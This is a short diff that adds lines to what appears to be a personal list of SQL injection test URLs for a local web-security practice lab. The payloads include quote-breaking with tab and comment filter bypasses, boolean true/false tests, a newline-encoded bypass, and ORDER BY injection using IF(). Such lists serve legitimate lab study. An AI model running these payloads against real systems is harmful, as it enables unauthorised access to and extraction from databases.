@@ -2,4 +2,9 @@ http://192.168.184.128/sqli/example1.php?name=root' and '1'='1
 http://192.168.184.128/sqli/example2.php?name=root'\tand\t'1'='1
 http://192.168.184.128/sqli/example3.php?name=root'/**/and/**/'1'='1
 http://192.168.184.128/sqli/example4.php?id=1 and 1=2
+http://192.168.184.128/sqli/example5.php?id=1 and 1=1
+http://192.168.184.128/sqli/example6.php?id=1 and 1=1
+http://192.168.184.128/sqli/example7.php?id=1%0a or 1=1  [%0a is '\n']
+http://192.168.184.128/sqli/example8.php?order=name'
+http://192.168.184.128/sqli/example9.php?order=IF(0,name,age)
 
